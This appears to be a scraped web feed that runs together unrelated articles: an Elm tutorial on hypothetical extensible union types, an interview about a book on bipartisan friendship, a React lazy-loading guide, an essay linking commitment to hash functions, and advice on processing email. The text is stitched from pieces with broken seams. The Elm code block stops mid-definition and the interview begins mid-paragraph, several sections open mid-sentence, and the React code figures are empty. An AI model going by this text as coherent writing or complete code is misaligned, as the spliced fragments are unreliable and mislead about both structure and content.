<p>To understand the relationship between extensible union types and normal union types, it’s perhaps illuminating to first consider the relationship between record types and normal product types.</p>
<p>Notice that Elm records differ from Elm’s normal product types by being</p>
<ol type="1">
<li>Structural: Normal product types in Elm are nominal, that is name-based. Every product type you use must have been declared somewhere and is given an explicit, unique name that is used for typechecking. On the other hand record types are anonymous. Though they can be given a name with <code>type alias</code> that name is non-canonical (the same record type can be given multiple different names) and plays no role in typechecking. In other words <em>the structure of a record type is all that matters to the type checker, not its name.</em></li>
<li>Extensible: Normal product type signatures must specify all possible fields it supports. Extensible records only need to specify a subset of fields and then leave the others unspecified.</li>
</ol>
<p>Just to make this clear, here are the three versions of a product type that Elm supports at the current moment.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- Normal Elm product type</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>type</span> <span>SomeProductType</span> <span>=</span> <span>ProductTypeConstructor</span> <span>Int</span> <span>String</span></span>
<span id="cb3-3"><a href="#cb3-3"></a></span>
<span id="cb3-4"><a href="#cb3-4"></a><span>-- Normal Elm record, notice the type alias rather than type</span></span>
<span id="cb3-5"><a href="#cb3-5"></a><span>type</span> <span>alias</span> <span>SomeRecord</span> <span>=</span> { <span>field0</span> : <span>Int</span><span>,</span> <span>field1</span> : <span>String</span> }</span>
<span id="cb3-6"><a href="#cb3-6"></a></span>
<span id="cb3-7"><a href="#cb3-7"></a><span>-- Extensible Elm record, notice the type variable</span></span>
<span id="cb3-8"><a href="#cb3-8"></a><span>type</span> <span>alias</span> <span>ExtensibleRecord</span> <span>a</span> <span>=</span> { <span>a</span> <span>|</span> <span>field0</span> : <span>Int</span><span>,</span> <span>field1</span> : <span>String</span> }</span></code></pre></div>
<p>Extensible union types introduce these two features, namely making a type structural and extensible, to union types. I find actual code to often be hepful here, so I’m going to introduce some hypothetical Elm syntax here.</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>-- Normal Elm sum type</span></span>
<span id="cb4-2"><a href="#cb4-2"></a><span>type</span> <span>User0</span> <span>=</span> <span>RegularUser</span> <span>Int</span> <span>|</span> <span>AdminUser</span> <span>String</span></span>
<span id="cb4-3"><a href="#cb4-3"></a></span>
<span id="cb4-4"><a href="#cb4-4"></a><span>-- Hypothetical extensible union type, again note that this is a type alias</span></span>
<span id="cb4-5"><a href="#cb4-5"></a><span>type</span> <span>alias</span> <span>User1</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span></span>
<span id="cb4-6"><a href="#cb4-6"></a></span>
<span id="cb4-7"><a href="#cb4-7"></a><span>-- Hypothetical extensible union type actually using the extensible portion,</span></span>
<span id="cb4-8"><a href="#cb4-8"></a><span>-- note the type variable</span></span>
<span id="cb4-9"><a href="#cb4-9"></a><span>type</span> <span>alias</span> <span>User2</span> <span>a</span> <span>=</span> <span>a</span> <span>or</span> <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span></span></code></pre></div>
<p>Let’s go over <code>User1</code> and <code>User2</code> in more detail. Names prefixed with a an <code>@</code> symbol such as <code>@RegularUser</code> are extensible union tags. These play an analogous role to field names in a record type. That is <code>@RegularUser Int</code> is an independent type in the same way <code>{ field0 : Int }</code> is an independent type, rather than just a value like <code>RegularUser Int</code>.</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>@</span><span>SomeVariantTag</span> <span>MyType</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>^</span> <span>tag</span> <span>name</span>      <span>^</span> <span>tagged</span> <span>type</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a>{ <span>recordField</span> : <span>MyType</span> }</span>
<span id="cb5-5"><a href="#cb5-5"></a>  <span>^</span> <span>tag</span> <span>name</span>    <span>^</span> <span>tagged</span> <span>type</span></span></code></pre></div>
<p>Likewise, just like record field names can be used as the value level to directly create a value, extensible union tags can be used at the value level to directly create a value.</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>someRegularUser</span> : <span>User1</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>-- Equivalently</span></span>
<span id="cb6-3"><a href="#cb6-3"></a><span>-- someRegularUser : @RegularUser Int or @AdminUser String</span></span>
<span id="cb6-4"><a href="#cb6-4"></a><span>-- or</span></span>
<span id="cb6-5"><a href="#cb6-5"></a><span>-- someRegularUser : @AdminUser String or @RegularUser Int</span></span>
<span id="cb6-6"><a href="#cb6-6"></a><span>-- Notice just like for record fields the order doesn't matter</span></span>
<span id="cb6-7"><a href="#cb6-7"></a><span>-- This is different from a normal sum type where Result String Int is</span></span>
<span id="cb6-8"><a href="#cb6-8"></a><span>-- different from Result Int String</span></span>
<span id="cb6-9"><a href="#cb6-9"></a><span>someRegularUser</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>Now we could also have assigned this type</p>
<div id="cb7"><pre><code><span id="cb7-1"><a href="#cb7-1"></a><span>someOtherRegularUser</span> : <span>@</span><span>RegularUser</span> <span>Int</span></span>
<span id="cb7-2"><a href="#cb7-2"></a><span>someOtherRegularUser</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>or</p>
<div id="cb8"><pre><code><span id="cb8-1"><a href="#cb8-1"></a><span>lotsOfIrrelevantVariants</span> : <span>@</span><span>Blah</span> <span>String</span> <span>or</span> <span>@</span><span>Blahblah</span> <span>Bool</span> <span>or</span> <span>@</span><span>RegularUser</span> <span>Int</span></span>
<span id="cb8-2"><a href="#cb8-2"></a><span>lotsOfIrrelevantVariants</span> <span>=</span> <span>@</span><span>RegularUser</span> <span>0</span></span></code></pre></div>
<p>For now let’s leave aside why all these type signatures work other than to hand-wave it and say they all make sense if you think of “or”. We’ll return to that in just a bit when we look close at extensible types. Instead, let’s look at how to actually work with extensible unions.</p>
<p>Fundamentally the only thing you can do with a product type is pull out its fields. On the flip side, fundamentally the only thing you can do with a union type is pattern match on its variants with a case statement.</p>
<p>This remains true for extensible unions, which have their own associated case statement for pattern matching on them, introduced by <code>case#</code> instead of <code>case</code> (you could unify them as a single <code>case</code> statement, but I’m separating them for clarity here).</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>toInt</span> : <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span> <span>-&gt;</span> <span>Int</span></span>
<span id="cb9-2"><a href="#cb9-2"></a><span>toInt</span> <span>user</span> <span>=</span> <span>case</span><span>#</span> <span>user</span> <span>of</span></span>
<span id="cb9-3"><a href="#cb9-3"></a>    <span>@</span><span>RegularUser</span> <span>x</span> <span>-&gt;</span> <span>x</span></span>
<span id="cb9-4"><a href="#cb9-4"></a></span>
<span id="cb9-5"><a href="#cb9-5"></a>    <span>@</span><span>AdminUser</span> <span>str</span> <span>-&gt;</span> <span>length</span> <span>str</span></span>
<span id="cb9-6"><a href="#cb9-6"></a></span>
<span id="cb9-7"><a href="#cb9-7"></a><span>-- We still have exhaustivity checking</span></span>
<span id="cb9-8"><a href="#cb9-8"></a><span>failsToCompile</span> : <span>@</span><span>RegularUser</span> <span>Int</span> <span>or</span> <span>@</span><span>AdminUser</span> <span>String</span> <span>-&gt;</span> <span>Int</span></span>

That’s the question at the heart of a new book, <a href="https://www.amazon.com/Union-Democrat-Republican-Search-Common/dp/0316423793" rel=" noopener"><em><span>Union: A Democrat, a Republican, and a Search for Common Ground</span></em></a>, by Jordan Blashek and Christopher Haugh.</p>
<!--more-->
<p>Chris and Jordan’s search for common ground despite their political differences is a mission that aligns well with The Factual. So I was delighted to sit down with them a few weeks ago to see if their road trip revealed insights that may be useful to all of us grappling with an <a href="https://www.pewresearch.org/politics/2014/06/12/political-polarization-in-the-american-public/"><span>increasingly polarized society</span></a>. Here are five excerpts from our <a href="https://bookpassage.extendedsession.com/session/jordan-blashek-chris-haugh/#registermodalheader"><span>fascinating conversation</span></a>:</p>
<p><img src="https://uploads-ssl.webflow.com/5e24da16992bfa6b6c3185d6/5e2641e4edc1c820dd1651f9_img-portrait-605KB.png" alt="5e2641e4edc1c820dd1651f9_img-portrait-605KB" width="2000"></p>
<h6><strong>You had many arguments on the road. Did you ever feel like throwing in the towel and saying this road trip was a bad idea?</strong></h6>
<p><strong>Jordan:</strong> I’m pretty sure Chris feels that way every time we have these arguments! I’m the combative one and love instigating our arguments. We have definitely had these moments. But over time we learned where our limits are and were respectful of them.</p>
<p><strong>Chris:</strong> We were lucky that our first argument was in a car, hundreds of miles away from the closest town. When you’re in the midst of one of those fights and suddenly one person says “I’m done,” he can’t really get out of the car. Something about being forced together taught us this lesson of coming back to the table and how important that is.</p>
<p>We were forced to go through this thought process of: “Oh my God, I can’t believe I’m here. I can’t believe I’m with him. I can’t believe he said that.” Then you start to think, “well, maybe I shouldn’t have said that one thing. And maybe he had a point about that one thing.” You start to go through a full-circle process. And that first fight ended with “I love you, man. I’m still angry and we haven’t resolved this. But I’m committed to this project and friendship.”&nbsp;</p>
<h6><strong>At the end of this trip, Chris said “I’m still a Democrat” and Jordan said “I’m still a Republican.” So what changed for you two on this trip?</strong></h6>
<p><strong>Jordan:</strong> For both of us two things have changed. One is personal to ourselves and the other is our views of the country.</p>
<p>When we started out on this trip I was the optimist. I was sure that wherever we went we’d find signs that America was strong, healthy, and vibrant. That the American people were good. And that it would be evident everywhere.&nbsp;</p>
<p>And Chris was more of a skeptic based on what he was hearing in the news and the data about various parts of American life. There would be signs of America coming apart and there would be signs of decay.&nbsp;</p>
<p>Over the course of three road trips, it changed both our views. In the end, Chris saw a lot of what led to my optimism and it made him view the country differently and I also saw a lot of the structural problems that Chris was worried about and it tempered my optimism.</p>
<p>On an individual level, having these individual conversations and fights and figuring out how our friendship can navigate that made us deeper people. We developed more empathy for the other side. We found blind spots in our own views and politics. And though we didn’t switch parties or change our beliefs it made our beliefs more rigorous and gave us the ability to see the world through other people’s eyes.</p>
<p><strong>Chris:</strong> I like to say that Jordan has made me a better liberal, and I think Jordan says the same about my impact on his conservatism.&nbsp;</p>
<p>Sometimes we don’t muster all the right evidence or are not aware of our blind spots, and our friends who think the same way we do are incapable of pointing them out. [When you engage with someone who has different beliefs] you’re able to refresh your arguments, have these moments of crisis, and come back stronger. Sometimes that means moderation, sometimes it means we become more radical. But hopefully, we become better citizens as a result.</p>
<h6><strong>A lot of your book is about a very diverse and memorable set of people you met on the road. For both of you, who was the most impactful person you met?</strong></h6>
<p><strong>Chris:</strong> Someone who’s a friend of mine these days is Pete Mylen. He’s a trucker from Daytona Beach, Florida who’s been on the road for 40 years. When we met him he had a Make America Great Again shirt, but we quickly realized he’s far more complex than that shirt might indicate.</p>
<p>The first time we brought up politics Pete said, “You know, I support the president but I really wish he’d talk more about climate change.” This coming from a guy driving a diesel truck at 80 miles an hour!&nbsp;</p>
<p>He went from there to talk about his faith, his support for LGBTQ marriage — all these policy ideas and values that I wouldn’t have necessarily associated with someone who wore a MAGA shirt four out of the five days we were with him. He really taught us how hard it is to look at someone and say “I know who that person is.” If you don’t actually talk to them, if you don’t actually engage with them, you don’t get to know what they actually think because oftentimes it’s easy to ascribe values to someone without looking more deeply into them.</p>
<p><strong>Jordan:</strong> For me, it was this man Gabriel, who was in <a href="https://www.michigan.gov/corrections/0,4551,7-119-68854_1381_1388-5339--,00.html" rel=" noopener">Parnall prison</a>. After our time with Pete, we did another road trip where we wanted to explore this idea of redemption. We believe that America is built on this idea of second chances, it’s a uniquely American value that pervades our ethos. And yet we had heard that the criminal justice system is a place where this might be out of sync with our ideal.</p>
<p>So in Detroit, we met this Shakespeare ensemble of 30 men from prison who were performing King Lear, and we were going to have a discussion on redemption afterward. And this one guy, Gabriel, is just throwing himself into the play, acting with all his energy. He’s interpreting everything with so much depth that Chris and I were in awe of his talent and his drive to better himself. Afterward, he talked about what it means to take personal responsibility and the a-ha moment that it takes to do something better with your life. He’s on my mind now because Parnall prison has been hit pretty hard by Covid and it’s a reminder that these men are in a really hard situation and are suffering. But I’m also thinking about the amount of talent and will Gabriel has, but knowing the barriers he’s going to face . . . really tugs at my heart.&nbsp;</p>
<h6><strong>My favorite line in the book is “we are at our worst when we speak for a flag or a group.” Can you expand on that?</strong></h6>
<p><strong><a href="https://www.amazon.com/Union-Democrat-Republican-Search-Common/dp/0316423793" rel=" noopener"><img src="https://images.booksense.com/images/793/423/9780316423793.jpg" alt="9780316423793" width="258"></a>Chris:</strong> This was a phenomenon we found over and over again. When we argue on behalf of people we had never met or groups whose policies we don’t always agree with, like the Democratic or Republican party, or a media organization like <em>The Times</em>, we were at our worst. Because we felt we had to be these two-dimensional figures because we had to defend these groups that we didn’t know all that well. And you’re searching for the talking points and trying to win because it’s almost like you have this symbol or value that represents good and the other person represents bad.&nbsp;</p>
<p>But when we were able to get away from that, when we were able to speak as other identities, just Jordan and Chris, conversations were about getting to the bottom of things.</p>
<p><strong>Jordan: </strong>I think it’s very unproductive when we’re speaking on behalf of our parties and defending things that might not necessarily align fully with our own beliefs. I think there’s a counterpart to it which is another way of engaging is through loyalty tests — “do you agree with x?” And if I say no then all of a sudden I’m not on your side anymore. It’s all about figuring out which tribe are you part of. Chris and I found that whenever we engaged in a way that seemed to say “if you disagree with me then you’re in that box and that box has bad things associated with it,” it led to more defensive arguments because now a bad association is leveled on me.&nbsp;</p>
<p>In the last few years I’ve had to face this question of “Do you support Donald Trump?” And the implication is that if you do then you’re a bad person. But it doesn’t get to the nuance that there are some things he does that I agree with, some things he does that I don’t agree with, and some things I probably hate. But putting it as a binary context puts me into a bind. So over time we moved away from thinking like that.</p>
<h6><strong>Do you think we talk about politics too much as a society?</strong></h6>
<p><strong>Jordan:</strong> Yes, absolutely. Politics has become everything. As Chris and I found, outside the glare of the cameras and political rhetoric the people we met were good people. We were able to connect at this very human level. Politics is all about line drawing. If you’re on this side of the line, you’re on my team. If you’re on that side of the line, you’re my enemy. So the fact that politics has invaded every aspect of life today, it’s not healthy. It’s what drives our intense polarization. It’s making us angrier and testier and doesn’t allow for the cultivation of friendship, grace, love, compassion, empathy.&nbsp;&nbsp;</p>

In general, there are a variety of options that are commonly used to implement this type of requirements, which typically fall into two categories: <br>1). Two separate UIs (one public app and the other one only accessible by admins)<br>2). Restrict the application pages/sections based on the users’ permissions.</p><p id="6c6a">I recently came across a situation while implementing a health care web application, where we had a bunch of UI components that were intended to be utilized from both medical personnel (admins) views as well as from the patients’ UI, so the second approach of the aforementioned ones made the most sense in that case.</p><p id="101d">One important issue we happen to have, however, was that even though we’ve got a lot of generic React components to be used across the entire app, a massive amount of them was not being rendered in all the pages our users were supposed to be interacting with, meaning that they’d end up downloading a <em>bundle.js </em>file containing lots of unneeded fragments of code. If a patient is <em>simply</em> filling out a form to schedule a doctor’s appointment, they won’t need the huge Google Maps component to locate the clinics they went to before, which might be only required by navigating to the <strong>/previousAppointments</strong> route for example.<br>So the idea is quite simple, just don’t have the users download code until they need it.</p><p id="4fe2">Now, you might be thinking that something like this would do the trick:</p><figure><div></div></figure><p id="f6b4">If you’re familiar with JavaScript and <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules" target="_blank" rel="noopener">ES modules</a> it wouldn’t take you so long to figure out that the above naive approach is not going to work, since by definition the modules are static, and therefore we must declare what we’re importing/exporting at compile-time, not at run time. In other words, they may only be specified at the top level of the files and not in other places such as an <em>if</em> statement.</p><p id="7003">That being said, let’s pretend for a moment that the above conditionally imported module worked. Can you think of any benefits of doing so? Certainly, instead of having to load all the application modules/components up-front, we’d be allowed to import them on demand depending on what page our visitors are at any given time, so that’d be a reasonable approach towards only downloading code the user requires.</p><p id="7676">Chances are you don’t care about IE11 anymore. But in our case, IE11 support was a must. So we concluded that if we ever find out a way to get the modules loaded conditionally, we might apply the same idea to execute legacy code <strong>only</strong> when the IE11 users landed on our web.</p><h2 id="1885">Dynamic EcmaScript modules to the rescue</h2><p id="367a">It turns out that there is a way to overcome the above-described issue: using the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import#Dynamic_Imports" target="_blank" rel="noopener">dynamic</a> <em>import()</em> syntax. The difference with the normal import is that instead of using it as we’d normally do, we use it <strong>like </strong>a function that returns a promise — although <code>import()</code> looks like a function call, it is not actually, it’s a special syntax that just happens to use parentheses similar to <code>super()</code>.<br>Using this expression, we can load the module and return a promise that resolves into a module object that contains all of its exports. Getting back to our example, it would be something like:</p><figure><div></div></figure><p id="e8c8">We can even use <em>await</em> if the <em>import</em> statement were inside an <em>async</em> function:</p><figure><div></div></figure><p id="fcb5">One thing to be aware of, though, is that this syntax is not officially added to the EcmaScript specification yet, and at the time of this writing it’s in <a href="https://github.com/tc39/proposal-dynamic-import" target="_blank" rel="noopener">stage 4 of the process</a>. If you’re using <a href="https://github.com/facebook/create-react-app" target="_blank" rel="noopener">Create React App</a> it’s already supported by default, otherwise, you just need to install a babel plugin named <code>plugin-syntax-dynamic-import</code></p><pre><span id="2a9e">npm install — save-dev @babel/plugin-syntax-dynamic-import</span></pre><p id="e59f">and then use it in the <code>.babelrc</code> configuration file:</p><pre><span id="9713">{ "plugins": ["@babel/plugin-syntax-dynamic-import"] }</span></pre><p id="f653">OK so now that we all know how to import modules dynamically, you might be wondering how to use this knowledge with React, and consequently, where should we split our application at? Well, there are a couple of approaches to address this question:</p><ol><li id="d3cd">Route level splitting</li><li id="a560">Component level splitting</li></ol><h2 id="21e7">Route level splitting</h2><p id="f42a">This is the most popular way when it comes to code splitting our app. Assuming you have some experience with any kind of routing tools, this should feel pretty natural after all, isn’t it? So this is where the <a href="https://reactjs.org/docs/code-splitting.html#reactlazy" target="_blank" rel="noopener"><em>React.lazy</em></a><em> </em>function comes into play. It accepts a function which must call the dynamic import, and returns a promise which resolves to a module with a <em>default</em> export containing a React component. This means that we don’t need to render the lazily loaded component by ourselves, instead, we render what <em>React.lazy</em> returns and it’ll take care of actually rendering the component.<br>Let’s take a look at how this would look like — I’m using <a href="https://reach.tech/router/" target="_blank" rel="noopener">reach-router</a> instead of the typical React Router, but it shouldn’t make any difference for this example:</p><figure><div></div></figure><p id="d3ff">And that’s all that it takes to code split our app at the route level. In the snippet, we’re just dynamically importing the <strong><em>PreviousAppointments</em></strong> route component, but we can also use the same approach on the other two routes if we wanted to. Below is the output when we build our app — <code>yarn run build</code> or <code>npm run build</code> depending on what the package manager of your choice is.</p><pre><span id="57f0">Asset                 Size       Chunks</span><span id="7475">app.91ac87d5.js       114  KiB   0 [emitted] <br>1.19z8duj4.chunk.js   7.97 KiB   1 [emitted] <br>vendors.j8z7cn1q.js   869  KiB   2 [emitted]</span></pre><p id="37a8">You’ll get one <code>chunk</code> file per each dynamic <code>import()</code> in the app.</p><p id="5d15">What if we wanted to show some content to the users while the components are being loaded dynamically? That’s what the <a href="https://reactjs.org/docs/concurrent-mode-suspense.html" target="_blank" rel="noopener"><em>React.Suspense</em></a> component is used for. Anytime we want to import dynamic components we can wrap them all into a <code>Suspense</code> instance and pass it a <code>fallback</code> prop which is a React element that is rendered <strong>until</strong> all of its children’s components get successfully loaded. Now let’s give it a shot at Suspense by turning all of our routes into dynamic components and passing it a <code>&lt;Loading /&gt;</code> element as a fallback:</p><figure><div></div></figure><h2 id="1dee">Component level splitting</h2><p id="1003">Code splitting your application at the routes level might represent a significant improvement in terms of the size of files that webpack builds out, so you may consider it as good enough in a few cases. However, there is still a more granular way of dynamically importing code in React — at the Component level.<br>Inside a single component, you might need to render a child component based on a certain state. Assuming our <code>Map</code> component is tremendously heavy, we can get it loaded <em>if and only if</em> it’s necessary — so we’d first show a button to the users and if they want to get the Map functionality in place on the current page then they can click on it to load the component based on that action.<br>At a glance, it might sound a little bit tricky to achieve, but in practice, it’s pretty straightforward:</p><figure><div></div></figure><p id="6d43">As you might have seen, there’s one small caveat in the above code.<br>If the module we’re dynamically importing is using ES modules (export default), it’ll have a <code>.default</code> property; this is only the case for ES modules, meaning that if the module is using commonjs (module.exports), it won’t.</p><p id="6499">Besides the dynamic <em>import()</em> proposal, another common approach to performing code splitting in client-side JavaScript is using the <code>require.ensure</code> method from webpack, but as stated in their <a href="https://webpack.js.org/guides/code-splitting/#dynamic-imports" target="_blank" rel="noopener">docs</a> the <em>import() </em>syntax should be preferred.</p><h2 id="fe43">Final thoughts</h2><p id="e534">A big gain we got in our application was the fact that we managed to optimize the bundles’ sizes since each of them ended up including only the sufficient modules/components depending on the type of users coming through the portal.</p><p id="86b4">React <code>lazy</code> and <code>Suspense</code> is definitely not a good fit if you’re using server-side rendering (SSR) in your project as this is not supported yet — I believe that might be one of the primary reasons for which those are still experimental features and are not included as part of the stable version of React. For SSR needs, React recommends a library named <a href="https://github.com/gregberge/loadable-components" target="_blank" rel="noopener">Loadable Components</a>. It has a nice <a href="https://loadable-components.com/docs/server-side-rendering/" target="_blank" rel="noopener">guide for bundle splitting with server-side rendering</a>.</p><p id="a68a">Another advantage of using code splitting was the ability to exclude administrative code for regular users to hide potentially sensitive data, which is a must while developing health care applications.</p><p id="36bc">Last but not least, be careful and use dynamic imports only when it makes sense. The static form is preferable for loading initial dependencies and can benefit more readily from static analysis tools and <a href="https://developer.mozilla.org/en-US/docs/Glossary/Tree_shaking" target="_blank" rel="noopener">tree shaking</a>.</p></div></div></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>When we think about commitments, we think about couples making
commitment to their relationship, group of talented and enthusiastic
people committed to <a href="https://minnatechnologies.com/about/">bringing power to the morden
consumers</a>, or a country
pledged to <a href="https://www.youtube.com/watch?v=QXqlziZV63k">land a man to the moon and return him safely on
earth</a>. It is an
obligation of being dedicated to a cause, activity or entity; a
process of focusing on something with neccessary resources at the
expense of oppurtunity cost. It is <a href="https://www.sparkpeople.com/mypage_public_journal_individual.asp?blog_id=2925515">what transforms a promise
into
reality</a>.</p>

<p>I always have this mental image when I think about commitment: a
bigger, fluffier and unstructured space being mapped to a smaller,
clearer and structured space. It is about less, not more. It is
about making specific, irrevocable choices instead of leaving the
options open. Even though commitment takes hard work and perseverance,
many studies seem to suggest that it is a major factor for
happiness. Actually, being happy itself is something that we can
commit to as well.</p>

<p>As programmers, we must be the subset of human beings that has
the most intimacy towards the concept of commitments since we do <em>git
commit</em> basically everyday. When we commit code, knowledge from a much
larger and fluid space are transformed to a specific
format stored on disk. We even get an id for this, called a
<a href="https://stackoverflow.com/questions/29106996/what-is-a-git-commit-id">commit
id</a>. The
commit id is an <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1</a> hash,
which is in fact a crypographic commitment to a bunch of things, such
as the content of the file, commit date, commit message, id of the
previous commit, etc. When the hash is being created, information from a much larger
space is mapped to a space with only 160 bits, which is still really,
really huge, but theoretically speaking there exists infinite number of
<a href="https://www.quora.com/What-are-preimages-in-the-context-of-cryptographic-hash-functions">preimages</a>
for any hash values.</p>

<p>The trick of a “good” hash function is to make
sure that the likelihood of finding another preimage that can be
hashed to the same value is astronomically low, otherwise the
cryptographic commitment is broken. This property is
called <a href="https://en.wikipedia.org/wiki/Collision_resistance">collision
resistence</a>. If we are being
objective, isn’t that the case for all types of commitments? Last time
I checked,
<a href="https://www.wf-lawyers.com/divorce-statistics-and-facts/">50%</a> of the
marriages in the United States will end in divorce. As much as we want
to romanticize it, it doesn’t change the fact that commitment is a game
of probabilities.</p>

<p>In cryptography, hash function can be thought of as a member in a bigger
family called <a href="https://en.wikipedia.org/wiki/Commitment_scheme">commitment
scheme</a>, which “allows
one to commit to a chosen value (or chosen statement) while keeping it
hidden to others, with the ability to reveal the committed value
later.” Hash can be thought of as one way to commit to static information. As
it turns out, we can create commitment to dynamic program as well, for
example, using <a href="http://cacr.uwaterloo.ca/techreports/2010/cacr2010-10.pdf">polynomial
commitment</a>. This
allows verifier who has this commitment to check if a claimed
evaluation of original program is valid. Under the hood, it is the same
probabilities game. Even though theoretically there might be infinite
number of programs that could produce the same commitment, the
likelihood of you happen to convince the verifier with another program
is astronomically small. Polynomial commitment at the core of many Zero
knowledge proofs (ZKP) systems, which has the potential to really help
us improve our current privacy situation.</p>

<p>Hash is my favourite cryptographic primitives. From user’s
perspective, it is simple, it is post quantum resistant, it is easy to
use. To the extent where people just take it for granted. I have a
strong believe that ZKP will make a great impact in the years to
come. It is fair to say that crypographic commitment makes the world a
better place and improve the collective happiness of human beings,
just like any other commitment we made in our lives.</p>

Got it?<br></p><p>For me, it’s a screwdriver. As the name explains, a screwdriver is for driving screws into the wall. Its design and functionality help achieve that end goal. It’s small, you can hold it with one hand, and the tip ensures perfect friction between you and the screw.<br></p><p>Now imagine using that same screwdriver to drive <em>nails</em> into the wall. By flipping the screwdriver around, you can use the opposite end to hit repeatedly on nails until they go into the wall.<br></p><p>Although that might work and get the job done, a screwdriver is most effective when using it to drive screws – the original intent of the tool.<br></p><p>It’s the same thing with email. You can use email as a task manager, a calendar, a filing cabinet, and a read later app. But when you do that, you’re drastically decreasing the effectiveness of the tool. You’re using a screwdriver as a hammer.<br>So how is email supposed to be used?</p><p>Before we get into how email <em>should</em> be used, let’s start with where you’re at.&nbsp;<br></p><p>If you haven’t already, unsubscribe from any newsletter, mailing list, or subscriptions that aren’t absolutely essential. If there are some you still want to read every now and then, check out this article on <a href="https://www.daltonmabery.com/ideas-and-insights/the-best-email-address-i-ever-made">creating a special newsletter email address</a>.<br></p><p>You can mass unsubscribe by using services like <a href="https://unroll.me/">Unroll.me</a>, or you can do it manually. If you have hundreds of subscriptions, try batching your time into 30-minute or hour-long chunks. Unsubscribing is not a cognitively high function, so it can be done while you’re watching tv, or when you’re just bored in a meeting.&nbsp;<br></p><p>Now that we’ve cleaned up your incoming mail, let’s <strong>get to Inbox 0.</strong><br></p><p>Most people have thousands of unread emails. Not only is this annoying, but it’s also decreasing the effectiveness of how email is supposed to be used. Let’s fix it.<br></p><p>You can use services like <a href="https://www.cleanfox.io/en/">Clean Fox</a> to save time and mass delete emails from the same sender. When I first did this, I had about 2,000 unread emails. I set up Clean Fox and was Inbox 0 in an hour and half and haven’t looked back since.<br></p><p>Finally, if you have multiple email addresses, set-up forwarding on all accounts to the one you use most often. If email is used to capture new inputs, we don’t want those coming from 5 different places. Using one email address as the “main hub” will make sure you don’t forget to check certain inboxes.</p><p>The core function of email is <strong>to capture new inputs</strong>.<br></p><p>Too many people use email to schedule their day, determine their priorities, and store documents like some sort of virtual filing cabinet. That’s not what it’s supposed to be&nbsp; used for.<br></p><p>Email should be used to capture new inputs.</p><p><strong>Email should be used to capture new inputs.</strong> Say it with me now.</p><p>Email should be used to capture new inputs.<br></p><p>If that’s the case, then learning what to do with those new inputs is the key to mastering email and using it effectively.</p><p>The ideal amount of times to check email is once or twice a week, but often people who work in corporate have to check it more. Use your discretion. The less, the better.<br></p><p>The best time to process email is at the beginning of your week either during your weekly review, or when you’re scheduling out your week. The reason I say process is because you shouldn’t be “working” on email, you should only be processing it.<br></p><p>During the processing time, it’s important to not ever work on email. If you get into the habit of working on emails when you’re processing them, you’ll get distracted and won’t make it through your inbox. This time is to process email, get a glimpse of what you need to be focusing on this week, or paying attention to. Use your email inbox to guide your week, but don’t use it to plan it.<br></p><p>When processing your email, there are only four actions you should take. Either archive the email, create a new to-do for the week, reply (Only if it takes two minutes or less.), or forward it.<br></p><p><strong>Every email is asking for your attention.</strong> So when a new one comes in looking sexy as ever saying, “Hey look at me. Stop what you’re doing and pay attention.” You have to be prepared with what to do.</p><h2>Archive It</h2><p>Most emails don’t need a response. So, we want to archive those immediately. Whether it’s a payment notification from Netflix, an update from The Morning Brew, or a receipt from the local coffee shop, archive it.<br></p><p>Some people think because it isn’t an important email, they just won’t open it. The problem with doing that leaves it at the forefront of your mind every time you go to check email. This steals a couple seconds away from other cognitive tasks, even though you’ve already determined it isn’t important.<br></p><p>Archive it. If you need to reference it later, it’ll always be waiting for you.</p><h2>Create a To Do</h2><p>The second action you can do with an email is create a to-do.&nbsp;<br></p><p>Where most people go wrong in regards to email using it as a task manager. Their day is spent checking their inbox, seeing what emails are asking of them, and doing the same thing the next day. Although this feels productive, it kills creative energy and doesn’t allow people to work on things that matter. People that use email like this will <strong>forever be maintaining, not innovating.</strong><br></p><p>If an email requires you to review a document, create a proposal, or anything else that takes longer than two minutes to do, create a task for it.<br></p><p>For example, if you get an email that has a word document containing copy for a slide deck you need to make, create a new task in your task manager saying, “Create slide deck for Tony.”&nbsp;<br></p><p>If you’re using a digital task manager, copy the link to that specific email and paste it in the notes section of the task. (I use Things 3 as my task manager.) This ensures quick access if you need more direction or need to ask a question when you’re ready to get started on the task.</p><h2>Reply</h2><p>The third action you could take is replying right away. The only caveat with this action is that you should only reply if it will take less than two minutes.&nbsp;<br></p><p>If you have to navigate to another window, check your phone for some reference, or ask someone else before you can reply, then don’t do it. Add it to your task manager.<br></p><h2>Forward</h2><p>If an email comes in that you know isn’t something you need to work on, then forward it to someone who can.<br></p><p>Honestly, this one’s pretty simple. Trust your judgment.</p><p>Now that you're back at inbox 0 and have an idea of what you need to work on in the following week, have a productive week.<br></p><p>If you can, don’t check your inbox for another 3-4 days. Continue working with no distractions on what you already have planned. The emails aren’t going anywhere.<br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
